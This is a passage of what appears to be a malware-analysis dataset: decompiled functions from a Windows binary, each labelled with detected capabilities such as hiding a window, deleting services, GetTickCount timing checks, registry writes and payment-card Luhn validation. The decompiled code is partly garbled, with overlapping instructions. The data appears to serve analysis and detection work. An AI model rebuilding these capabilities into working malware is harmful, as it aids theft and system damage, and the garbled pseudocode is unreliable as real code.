        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b19) overlaps instruction at (ram,0x00404b15)\n// \n\nuint * __cdecl fcn.00404a30(uint *hSCManager, uchar *lpServiceName, char *arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    ushort uVar3;\n    uint *puVar4;\n    uint8_t *unaff_EBX;\n    char *pcVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    bool bVar9;\n    char cVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uint uVar13;\n    \n    puVar4 = lpServiceName + (hSCManager - arg_14h);\n    bVar9 = arg_14h != 0;\n    if (bVar9) {\n        uVar3 = SUB42(puVar4, 0);\n        if ((bVar9) && (!bVar9)) {\n            uVar13 = 4;\n            _pe_dos_header = in(uVar3);\n            if (0 < &stack0xfffffff0) {\n                uVar1 = hSCManager ^ 0xdee0ed6d;\n                *unaff_EBX = *unaff_EBX ^ unaff_EBX >> 8;\n                return uVar1 & 0xffff0000 | uVar1 + (uVar1 >> 8) * -0x31;\n            }\n            out(*lpServiceName, uVar3);\n            uVar11 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n            puVar7 = uVar11;\n            bVar9 = false;\n            cVar10 = puVar7 == NULL;\n            if (cVar10) {\n                return NULL;\n            }\n            if (cVar10) goto code_r0x00404b21;\n            if (!cVar10) goto code_r0x00404b21;\n            while( true ) {\n                puVar7 = uVar11 + 1;\n                out(*uVar11, uVar11 >> 0x20);\ncode_r0x00404b21:\n                uVar12 = (*_sym.imp.ADVAPI32.dll_DeleteService)(puVar7, uVar13);\n                uVar11 = uVar12 & 0xffffffff00000000 | ZEXT48(puVar7);\n                puVar4 = uVar12;\n                if (((bVar9) || (!bVar9)) || (extraout_ECX == 1 || cVar10 == '\\0')) break;\n                bVar9 = CARRY1(*puVar4, uVar12);\n                *puVar4 = *puVar4 + uVar12;\n                cVar10 = *puVar4 == '\\0';\n            }\n            *puVar4 = puVar7 + 4;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            return puVar4;\n        }\n        pcVar5 = arg_10h;\n        if (hSCManager <= puVar4) {\n            do {\n                pcVar8 = pcVar5;\n                if ((hSCManager != puVar4) && (hSCManager == puVar4)) {\n                    hSCManager = hSCManager & 0xffffff00 | *0x4bb148d3;\n                    pcVar8 = pcVar5 + 1;\n                    out(*pcVar5, uVar3);\n                }\n                if (*hSCManager == *pcVar8) {\n                    bVar9 = true;\n                    iVar2 = arg_14h;\n                    puVar6 = hSCManager;\n                    do {\n                        pcVar8 = pcVar8 + 1;\n                        puVar6 = puVar6 + 1;\n                        iVar2 = iVar2 + -1;\n                        if (iVar2 == 0) break;\n                        bVar9 = *puVar6 == *pcVar8;\n                    } while (bVar9);\n                    pcVar8 = arg_10h;\n                    if (bVar9) {\n                        return hSCManager;\n                    }\n                }\n                hSCManager = hSCManager + 1;\n                pcVar5 = pcVar8;\n            } while (hSCManager <= puVar4);\n        }\n        hSCManager = NULL;\n    }\n    return hSCManager;\n}\n",
        "token_count": 978
    },
    "00404b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b6b) overlaps instruction at (ram,0x00404b6a)\n// \n\nbool __cdecl fcn.00404b50(uint arg_8h)\n\n{\n    char cVar1;\n    uint8_t in_AL;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_ch;\n    ushort in_stack_fffffff8;\n    \n    if (!in_CF) {\n        uVar2 = CONCAT22(unaff_EDI, in_stack_fffffff8);\n        if (in_CF) goto code_r0x00404b5b;\n    }\n    uVar2 = 1;\n    in_AL = arg_8h;\ncode_r0x00404b5b:\n    cVar1 = in_AL - *unaff_EDI;\n    arg_ch = (in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 |\n             in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    uVar2 = func_0x1018aadd(arg_ch, uVar2);\n    iVar3 = fcn.00402320(uVar2, arg_ch);\n    return iVar3 != 0;\n}\n",
        "token_count": 493
    },
    "00404df0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404e39) overlaps instruction at (ram,0x00404e37)\n// \n// WARNING: Removing unreachable block (ram,0x00404e14)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00404df0(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch;\n    uint *puVar2;\n    char cVar3;\n    char cVar4;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    cVar4 = '\\0';\n    cVar3 = '\\0';\n    fcn.00404b90(&uStack108, &uStack8);\n    arg_ch = uStack8;\n    if ((cVar4 == cVar3) && (cVar4 != cVar3)) {\n        arg_ch = extraout_EDX;\n    }\n    fcn.00403440(&uStack108, arg_ch, 0x411428, 0x12000);\n    *param_1 = 0x411428;\n    *param_2 = 0x12000;\n    return;\n}\n",
        "token_count": 368
    },
    "00403360": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403407) overlaps instruction at (ram,0x00403406)\n// \n// WARNING: Removing unreachable block (ram,0x004033f2)\n// WARNING: Removing unreachable block (ram,0x00403407)\n\nbool __cdecl fcn.00403360(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 244
    },
    "004020c0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004020c0(uint arg_8h)\n\n{\n    ushort in_DX;\n    uchar *unaff_ESI;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 111
    },
    "00401f00": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401f00(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 97
    },
    "00404ad0": {
        "rules": [
            "contain loop",
            "get service handle",
            "delete service"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b19) overlaps instruction at (ram,0x00404b15)\n// \n\nuint * __fastcall fcn.00404ad0(uint param_1, ushort param_2, uint param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t extraout_ECX;\n    uchar *unaff_ESI;\n    uchar *puVar2;\n    bool bVar3;\n    bool in_ZF;\n    char cVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, param_2);\n    }\n    uVar5 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(param_3, param_4, 0xf01ff);\n    puVar2 = uVar5;\n    bVar3 = false;\n    cVar4 = puVar2 == NULL;\n    if (!cVar4) {\n        if (cVar4) goto code_r0x00404b21;\n        if (!cVar4) goto code_r0x00404b21;\n        while( true ) {\n            puVar2 = uVar5 + 1;\n            out(*uVar5, uVar5 >> 0x20);\ncode_r0x00404b21:\n            uVar6 = (*_sym.imp.ADVAPI32.dll_DeleteService)(puVar2);\n            uVar5 = uVar6 & 0xffffffff00000000 | ZEXT48(puVar2);\n            puVar1 = uVar6;\n            if (((bVar3) || (!bVar3)) || (extraout_ECX == 1 || cVar4 == '\\0')) break;\n            bVar3 = CARRY1(*puVar1, uVar6);\n            *puVar1 = *puVar1 + uVar6;\n            cVar4 = *puVar1 == '\\0';\n        }\n        *puVar1 = puVar2 + 4;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return puVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 474
    },
    "00402820": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402820(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071dc, 0x407220, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}